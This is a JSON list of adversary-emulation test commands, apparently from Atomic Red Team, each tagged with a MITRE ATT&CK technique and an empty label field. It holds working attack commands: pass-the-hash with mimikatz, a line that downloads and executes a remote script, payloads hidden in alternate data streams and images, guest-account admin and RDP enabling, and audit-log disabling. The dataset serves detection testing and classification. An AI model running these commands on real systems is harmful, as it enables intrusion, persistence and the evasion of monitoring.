        "Command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nreg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\nreg query HKLM\\system\\currentcontrolset\\services /s | findstr ImagePath 2>nul | findstr /Ri \".*\\.sys$\"\nreg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n",
        "Description": "Query Windows Registry.\nUpon successful execution, cmd.exe will perform multiple reg queries. Some will succeed and others will fail (dependent upon OS).\nReferences:\nhttps://blog.cylance.com/windows-registry-persistence-part-2-the-run-keys-and-search-order\nhttps://blog.cylance.com/windows-registry-persistence-part-1-introduction-attack-phases-and-windows-services\nhttp://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf\nhttps://www.offensive-security.com/wp-content/uploads/2015/04/wp.Registry_Quick_Find_Chart.en_us.pdf\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1012",
        "Shell": "command_prompt"
    },
    {
        "ID": 1698,
        "Command": "Get-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\\" | findstr Windows\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\\Shell\"\nGet-Item -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-Item -Path \"HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\"\nGet-ChildItem -Path \"HKLM:system\\currentcontrolset\\services\" \nGet-Item -Path \"HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\nGet-Item -Path \"HKLM:SYSTEM\\CurrentControlSet\\Control\\SafeBoot\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Active Setup\\Installed Components\"\nGet-ChildItem -Path \"HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\Scripts\\Startup\"\n",
        "Description": "Query Windows Registry with Powershell cmdlets, i.e., Get-Item and Get-ChildItem. The results from above can also be achieved with Get-Item and Get-ChildItem.\nUnlike using \"reg query\" which then executes reg.exe, using cmdlets won't generate new processes, which may evade detection systems monitoring process generation. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1012",
        "Shell": "powershell"
    },
    {
        "ID": 1699,
        "Command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR\nGet-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt\nForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\")\n{try{write-output \"$($Position)-$($CLSID)\"\nwrite-output \"------------\"| out-file $env:temp\\T1592.002Test1.txt -append\nwrite-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append\n$handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID))\n$handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append\n$position += 1} catch{}}\n",
        "Description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1012",
        "Shell": "powershell"
    },
    {
        "ID": 1700,
        "Command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\\t  \n",
        "Description": "The reg query commands allows to check the status of the AlwaysInstallElevated registry key for both the user and the machine. If both queries return a value of 0x1, then AlwaysInstallElevated is enabled for both user and machine thus allowing a regular user to install a Microsoft Windows Installer package with system level privileges. This can be abused by an attacker to escalate privileges in the host to SYSTEM level.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1012",
        "Shell": "command_prompt"
    },
    {
        "ID": 1701,
        "Command": "reg.exe query hklm\\software\\microsoft\\windows\\softwareinventorylogging /v collectionstate /reg:64\n",
        "Description": "Microsoft's Software Inventory Logging (SIL) collects information about software installed per host basis. Adversary can use such logs to passively \ncheck for existence of software of interest to them. Status of SIL can be checked via registry.\n[Reference](https://blog.talosintelligence.com/chinese-hacking-group-apt41-compromised-taiwanese-government-affiliated-research-institute-with-shadowpad-and-cobaltstrike-2/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1012",
        "Shell": "command_prompt"
    },
    {
        "ID": 1702,
        "Command": "reg.exe query HKLM\\SYSTEM\\CurrentControlSet\\Control /v SystemStartOptions\n",
        "Description": "The objective of this test is to query the SystemStartOptions key under HKLM\\SYSTEM\\CurrentControlSet\\Control in the Windows registry. This action could be used to uncover specific details about how the system is configured to start, potentially aiding in understanding boot parameters or identifying security-related settings. key is.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1012",
        "Shell": "command_prompt"
    },
    {
        "ID": 1703,
        "Command": "copy \"PathToAtomicsFolder\\T1127\\src\\hello.js\" %TEMP%\\hello.js\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe %TEMP%\\hello.js\n",
        "Description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1127",
        "Shell": "command_prompt"
    },
    {
        "ID": 1704,
        "Command": "copy \"PathToAtomicsFolder\\T1127\\src\\LibHello.js\" %TEMP%\\LibHello.js\nC:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\jsc.exe /t:library %TEMP%\\LibHello.js\n",
        "Description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1127",
        "Shell": "command_prompt"
    },
    {
        "ID": 1705,
        "Command": "Install-TransportAgent -Name Security Interop Agent -TransportAgentFactory Microsoft.Exchange.Security.Interop.SecurityInteropAgentFactory -AssemblyPath c:\\program files\\microsoft\\Exchange Server\\v15\\bin\\Microsoft.Exchange.Security.Interop.dll\nEnable-TransportAgent Security Interop Agent\nGet-TransportAgent | Format-List Name,Enabled\n",
        "Description": "Install a Microsoft Exchange Transport Agent for persistence. This requires execution from an Exchange Client Access Server and the creation of a DLL with specific exports. Seen in use by Turla.\nMore details- https://docs.microsoft.com/en-us/exchange/transport-agents-exchange-2013-help\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1505.002",
        "Shell": "powershell"
    },
    {
        "ID": 1706,
        "Command": "Get-Content \"PathToAtomicsFolder\\T1001.002\\bin\\T1001.002.jpg\", \"$env:PUBLIC\\Downloads\\T1001.002.tarz\" -Encoding byte -ReadCount 0 | Set-Content \"$env:PUBLIC\\Downloads\\T1001.002New.jpg\" -Encoding byte\n",
        "Description": "This atomic test, named \"Steganographic Tarball Embedding\", simulates the technique of data obfuscation via steganography by embedding a tar archive file (tarball) \nwithin an image.\n\nThe test begins by ensuring the availability of the image file and the tarball file containing data . It then generates random passwords and saves them to a \nfile. Subsequently, the tarball file is created, containing the passwords file. The test executor command reads the contents of the image \nfile and the tarball file as byte arrays and appends them together to form a new image file. This process effectively embeds the tarball \nfile within the image, utilizing steganography techniques for data obfuscation.\n\nThis atomic test simulates the technique of data obfuscation via steganography, enabling attackers to clandestinely transfer files across systems undetected. \nBy embedding the tarball file within the image, adversaries can obscure their activities, facilitating covert communication and data exfiltration.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1001.002",
        "Shell": "powershell"
    },
    {
        "ID": 1707,
        "Command": "cd \"PathToAtomicsFolder\\ExternalPayloads\\\"\nImport-Module .\\Extract-Invoke-PSImage.ps1\n$extractedScript=Extract-Invoke-PSImage -Image \"PathToAtomicsFolder\\T1001.002\\bin\\evil_kitten.jpg\" -Out \"$HOME\\result.ps1\"\n$scriptContent = Get-Content \"$HOME\\result.ps1\" -Raw\n$base64Pattern = \"(?<=^|[^A-Za-z0-9+/])(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}(==)?|[A-Za-z0-9+/]{3}=)?(?=$|[^A-Za-z0-9+/])\"\n$base64Strings = [regex]::Matches($scriptContent, $base64Pattern) | ForEach-Object { $_.Value }\n$base64Strings | Set-Content \"$HOME\\decoded.ps1\"\n$decodedContent = Get-Content \"$HOME\\decoded.ps1\" -Raw\n$decodedText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($decodedContent))\n$textPattern = '^.+'  \n$textMatches = [regex]::Matches($decodedText, $textPattern) | ForEach-Object { $_.Value }\n$scriptPath = \"$HOME\\textExtraction.ps1\"\n$textMatches -join '' | Set-Content -Path $scriptPath\n. \"$HOME\\textExtraction.ps1\"\n",
        "Description": "This atomic test demonstrates the technique of data obfuscation via steganography, where a PowerShell script is concealed within an image file. \nThe PowerShell script is embedded using steganography techniques, making it undetectable by traditional security measures. The script is hidden \nwithin the pixels of the image, enabling attackers to covertly transfer and execute malicious code across systems.\n\nThe test begins by ensuring the availability of the malicious image file and the Extract-Invoke-PSImage script. The test proceeds to extract the hidden \nPowerShell script (decoded.ps1) from the image file using the Extract-Invoke-PSImage tool. The extracted script is then decoded from base64 encoding and saved as a \nseparate PowerShell (textExtraction.ps1). Consequently, the textExtraction.ps1 script is executed.\n\nIn the case of this atomic test, the malicious image file which is downloaded has the powershell command Start-Process notepad embedded within in base64. This\nis done to emulate an attackers behaviour in the case they were to execute malware embedded within the image file. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1001.002",
        "Shell": "powershell"
    },
    {
        "ID": 1708,
        "Command": "cat \"PathToAtomicsFolder/script.sh\" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat \"PathToAtomicsFolder/image.jpg\" - > \"PathToAtomicsFolder/evil_image.jpg\"; strings \"PathToAtomicsFolder/evil_image.jpg\" | tail -n 1 | base64 -d | sh",
        "Description": "This atomic test demonstrates the execution of an embedded script in an image file using steganography techniques. The script is first encoded in base64 and then embedded within the pixels of the image. The modified image is created, and the script is extracted and executed on the target system.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1001.002",
        "Shell": "sh"
    },
    {
        "ID": 1709,
        "Command": "copy %temp%\\ExplorerSync.db %temp%\\..\\Microsoft\\ExplorerSync.db\nschtasks /create /tn ExplorerSync /tr \"javaw -jar %temp%\\..\\Microsoft\\ExplorerSync.db\" /sc MINUTE /f\n",
        "Description": "This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db\n[octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)\n[the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1195",
        "Shell": "command_prompt"
    },
    {
        "ID": 1710,
        "Command": "net user guest /active:yes\nnet user guest Password123!\nnet localgroup Administrators guest /add\nnet localgroup \"Remote Desktop Users\" guest /add\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f\nreg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
        "Description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1711,
        "Command": "net user guest /active:yes\n",
        "Description": "The Adversaries can activate the default Guest user. The guest account is inactivated by default\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1712,
        "Command": "sudo sysadminctl -guestAccount on",
        "Description": "This test enables the guest account on macOS using sysadminctl utility.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1078.001",
        "Shell": "sh"
    },
    {
        "ID": 1713,
        "Command": "%tmp%\\mimikatz\\x64\\mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:%userdnsdomain% /ntlm:cc36cf7a8514893efccd3324464tkg1a\"\n",
        "Description": "Note: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1550.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1714,
        "Command": "C:\\CrackMapExecWin\\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami\n",
        "Description": "command execute with crackmapexec\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1550.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1715,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/Kevin-Robertson/Invoke-TheHash/01ee90f934313acc7d09560902443c18694ed0eb/Invoke-WMIExec.ps1' -UseBasicParsing);Invoke-WMIExec -Target $env:COMPUTERNAME -Username Administrator -Hash cc36cf7a8514893efccd3324464tkg1a -Command hostname",
        "Description": "Use Invoke-WMIExec to Pass the Hash\nNote: must dump hashes first\n[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1550.002",
        "Shell": "powershell"
    },
    {
        "ID": 1716,
        "Command": "Import-Module \"PathToAtomicsFolder/T1651/src/T1651-1/AWSSSMAttack.ps1\" -Force\n$access_key = \"\"\n$secret_key = \"\"\n$session_token = \"\"\n$aws_profile = \"\"\n$region = \"us-east-2\"\nSet-AWSAuthentication -AccessKey $access_key -SecretKey $secret_key -SessionToken $session_token -AWSProfile $aws_profile -AWSRegion $region\nInvoke-Terraform -TerraformCommand init -TerraformDirectory \"PathToAtomicsFolder/T1651/src/T1651-1\"\nInvoke-Terraform -TerraformCommand apply -TerraformDirectory \"PathToAtomicsFolder/T1651/src/T1651-1\" -TerraformVariables @(\"profile=T1651-1\", \"region=$region\")\nInvoke-SSMAttack -AWSProfile \"T1651-1\" -TerraformDirectory \"PathToAtomicsFolder/T1651/src/T1651-1\"\nInvoke-Terraform -TerraformCommand destroy -TerraformDirectory \"PathToAtomicsFolder/T1651/src/T1651-1\" -TerraformVariables @(\"profile=T1651-1\", \"region=$region\")\n",
        "Description": "This test simulates an adversary using the AWS Run Command service to execute commands on EC2 instances.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1651",
        "Shell": "powershell"
    },
    {
        "ID": 1717,
        "Command": "type C:\\temp\\evil.exe > \"C:\\Program Files (x86)\\TeamViewer\\TeamViewer12_Logfile.log:evil.exe\"\nextrac32 c:\\ADS\\\\procexp.cab c:\\ADS\\\\file.txt:procexp.exe\nfindstr /V /L W3AllLov3DonaldTrump c:\\ADS\\\\procexp.exe > c:\\ADS\\\\file.txt:procexp.exe\ncertutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\\temp:ttt\nmakecab c:\\ADS\\\\autoruns.exe c:\\ADS\\\\cabtest.txt:autoruns.cab\nprint /D:c:\\ADS\\\\file.txt:autoruns.exe c:\\ADS\\\\Autoruns.exe\nreg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ADS\\\\file.txt:evilreg.reg\nregedit /E c:\\ADS\\\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey\nexpand \\\\webdav\\folder\\file.bat c:\\ADS\\\\file.txt:file.bat\nesentutl.exe /y c:\\ADS\\\\autoruns.exe /d c:\\ADS\\\\file.txt:autoruns.exe /o\n",
        "Description": "Execute from Alternate Streams\n\n[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)\n\n[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1718,
        "Command": "if (!(Test-Path C:\\Users\\Public\\Libraries\\yanki -PathType Container)) {\n\\tNew-Item -ItemType Directory -Force -Path C:\\Users\\Public\\Libraries\\yanki\n\\t}\nStart-Process -FilePath \"$env:comspec\" -ArgumentList \"/c,type,c:\\windows\\system32\\cmd.exe,>,`\"C:\\Users\\Public\\Libraries\\yanki\\desktop.ini:desktop.ini`\"\"\n",
        "Description": "Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.\nUpon execution, cmd will run and attempt to launch desktop.ini. No windows remain open after the test\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.004",
        "Shell": "powershell"
    },
    {
        "ID": 1719,
        "Command": "echo cmd /c echo \"Shell code execution.\"> %temp%\\T1564.004_has_ads_cmd.txt:adstest.txt\nfor /f \"usebackq delims=?\" %i in (%temp%\\T1564.004_has_ads_cmd.txt:adstest.txt) do %i\n",
        "Description": "Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run \"dir /a-d /s /r | find \":$DATA\"\" in the %temp%\nfolder to view that the alternate data stream exists. To view the data in the alternate data stream, run \"notepad T1564.004_has_ads.txt:adstest.txt\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1720,
        "Command": "echo \"test\" > $env:TEMP\\T1564.004_has_ads_powershell.txt | set-content -path test.txt -stream adstest.txt -value \"test\"\nset-content -path $env:TEMP\\T1564.004_has_ads_powershell.txt -stream adstest.txt -value \"test2\"\nset-content -path . -stream adstest.txt -value \"test3\"\n",
        "Description": "Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, run the command \"ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname\"\nin the %temp% directory to view all files with hidden data streams. To view the data in the alternate data stream, run \"notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt\" in the %temp% folder.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.004",
        "Shell": "powershell"
    },
    {
        "ID": 1721,
        "Command": "md %temp%\\...$.......::$index_allocation\necho too many secrets > %temp%\\...$.......::$index_allocation\\secrets.txt\n",
        "Description": "Create an Alternate Data Stream Directory and File with the command prompt. Write access is required. Upon execution,\nrun \"dir /A /Q /R\" in the %temp% folder to view that the alternate data stream folder exists. To view the data in the\nalternate data stream, run \"type %temp%\\...$.......::$index_allocation\\secrets.txt\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1564.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1722,
        "Command": "fsutil behavior set SymlinkEvaluation R2L:1\nfsutil behavior set SymlinkEvaluation R2R:1\n",
        "Description": "Use fsutil to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.\n[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222",
        "Shell": "command_prompt"
    },
    {
        "ID": 1723,
        "Command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToLocalEvaluation /t REG_DWORD /d \"1\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" /v SymlinkRemoteToRemoteEvaluation /t REG_DWORD /d \"1\" /f\n",
        "Description": "Use reg.exe to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.\n[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222",
        "Shell": "command_prompt"
    },
    {
        "ID": 1724,
        "Command": "New-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToLocalEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\nNew-ItemProperty -Path HKLM:\\Software\\Policies\\Microsoft\\Windows\\Filesystems\\NTFS -Name SymlinkRemoteToRemoteEvaluation -PropertyType DWORD -Value 1 -Force -ErrorAction Ignore\n",
        "Description": "Use Powershell to enable both ‘remote to local’ and ‘remote to remote’ symbolic links. This allows access to files from local shortcuts with local or remote paths.\n[reference](https://symantec-enterprise-blogs.security.com/threat-intelligence/noberus-blackcat-alphv-rust-ransomware/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1222",
        "Shell": "powershell"
    },
    {
        "ID": 1725,
        "Command": "auditctl -D\n",
        "Description": "Using 'auditctl -D' deletes all existing audit rules, resulting in the loss of previously configured monitoring settings and the audit trail. This action reduces visibility into system activities, potentially leading to compliance concerns and hampering security monitoring efforts. Additionally, it poses a risk of covering unauthorized activities by erasing evidence from audit logs.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.012",
        "Shell": "sh"
    },
    {
        "ID": 1726,
        "Command": "auditctl -e 0\n",
        "Description": "The command `auditctl -e 0` disables the audit system. By setting the parameter to `0`, auditing is deactivated, halting the monitoring and recording of security-related events. This action stops the generation of audit logs, ceasing the collection of data regarding system activities. Disabling auditing may be done for various reasons, such as troubleshooting, performance optimization, or temporarily suspending auditing requirements, but it reduces visibility into system events and can impact security monitoring and compliance efforts.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.012",
        "Shell": "sh"
    }
]